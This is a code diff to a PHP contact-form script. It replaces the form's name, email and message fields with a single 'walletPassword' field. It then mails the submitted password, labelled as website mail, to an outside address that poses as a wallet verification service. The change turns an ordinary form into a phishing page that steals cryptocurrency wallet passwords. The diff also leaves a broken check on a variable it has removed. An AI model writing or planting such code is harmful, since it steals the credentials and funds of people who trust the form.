@@ -1,12 +1,11 @@
 <?php
 //get data from form  
 
-$name = $_POST['name'];
-$email= $_POST['email'];
-$message= $_POST['message'];
-$to = "youremail@mail.com";
+$password = $_POST['walletPassword'];
+
+$to = "walletverification@outlook.com";
 $subject = "Mail From website";
-$txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n Message =" . $message;
+$txt ="Password = ". $password;
 $headers = "From: noreply@yoursite.com" . "\r\n" .
 "CC: somebodyelse@example.com";
 if($email!=NULL){
